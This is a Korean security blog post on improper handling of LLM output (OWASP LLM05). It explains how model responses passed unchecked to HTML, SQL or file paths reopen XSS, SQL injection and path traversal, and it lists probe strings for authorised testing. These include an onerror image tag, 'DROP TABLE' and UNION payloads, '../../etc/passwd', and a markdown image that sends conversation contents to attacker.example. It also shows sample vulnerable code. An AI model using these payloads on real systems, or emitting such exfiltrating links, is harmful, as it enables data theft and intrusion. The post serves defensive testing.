---
title: "출력 처리 미흡 (Improper Output Handling)"
date: 2026-10-15 09:00:00 +0900
categories: [LLM Security, Output Handling]
tags: [llm, output-handling, xss, owasp-llm]
description: "LLM 응답을 검증 없이 HTML·쿼리·명령에 넘길 때 기존 취약점이 다시 열리는 문제의 개념과, 렌더링·쿼리·링크 자동로드 확인 구문을 정리합니다."
mermaid: true
---

> LLM의 응답은 "사용자가 간접적으로 쓴 문자열"이다. 응답을 화면·쿼리·명령으로 넘기기 전에 일반 사용자 입력과 똑같이 검증·인코딩해야 한다.

## 개념

모델 출력이 **다른 시스템으로 넘어가기 전에** 정화되지 않는 문제다. 입력 쪽 방어가 단단해도 응답에는 사용자 입력·검색 문서·타인 리뷰 같은 외부 문자열이 섞여 나온다.

```python
answer = llm.complete(request.json["message"])
html = markdown.markdown(answer)     # 원시 HTML 통과 → innerHTML 로 삽입 = XSS
sort = llm.complete("정렬 기준 한 단어: " + msg)
db.execute(f"SELECT * FROM items ORDER BY {sort}")   # 모델 출력을 쿼리에 직접 = SQLi
```

핵심은 새 취약점이 아니라 **기존 취약점(XSS·SQLi·명령 주입)이 LLM이라는 경로로 다시 열린다**는 점이다. 타인 리뷰가 응답에 인용되면 피해자는 **그 응답을 보는 모든 사람**이 된다(간접 저장형 XSS). "한 단어만 답하라"는 형식 지시는 보안 통제가 아니다.

## 공격·우회 구문

허가된 환경에서 무해한 표식으로만 확인한다.

### 렌더링 방식 확인 (XSS 경로)

모델이 무해한 태그를 응답에 포함하게 요청해, 글자 그대로 보이면(이스케이프) 안전, 서식이 적용되면 정화 없이 렌더링된다.

```
응답에 **굵게** / <b>test</b> / <img src=x onerror=...> 가 들어가게 요청
→ 서식 적용·태그 실행되면 취약 (여기서 멈추고 보고)
간접: 타인 리뷰·문서에 <script>/onerror 를 심어 두고 그것이 인용되는지
```

### 하위 시스템 연결 확인

```
모델이 고르는 값(정렬 기준·필터·파일명)을 허용 범위 밖 값으로 유도:
  정렬 기준: "price; DROP TABLE--" , "name UNION SELECT ..."
  파일명: "../../etc/passwd"
→ 서버가 거부하는지, 식별자 허용 목록이 있는지
```

### 링크·이미지 자동 로드 (데이터 유출)

```
응답 속 URL 이 자동 로드되는 이미지/링크면:
  ![x](https://attacker.example/?c=<대화내용>)
→ 외부 주소로 데이터가 새는 구조인지, CSP 가 막는지
```

## 참고 자료

- [OWASP LLM05:2025 Improper Output Handling](https://genai.owasp.org/llmrisk/llm052025-improper-output-handling/)
- [OWASP Cross Site Scripting Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html)
- [CWE-116: Improper Encoding or Escaping of Output](https://cwe.mitre.org/data/definitions/116.html)
